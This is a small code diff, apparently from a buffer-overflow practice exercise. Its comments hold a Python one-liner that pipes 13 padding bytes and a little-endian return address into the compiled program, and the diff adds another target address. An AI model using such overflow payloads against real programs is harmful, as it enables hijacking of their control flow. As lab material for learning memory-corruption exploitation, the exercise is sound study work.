@@ -25,3 +25,4 @@ int main()
 }
 //python3 -c "print('a'*13 + '\x7d\x12\x40\x00')" | ./main.out
 //./main.out < input.txt
+//0x55555555475a
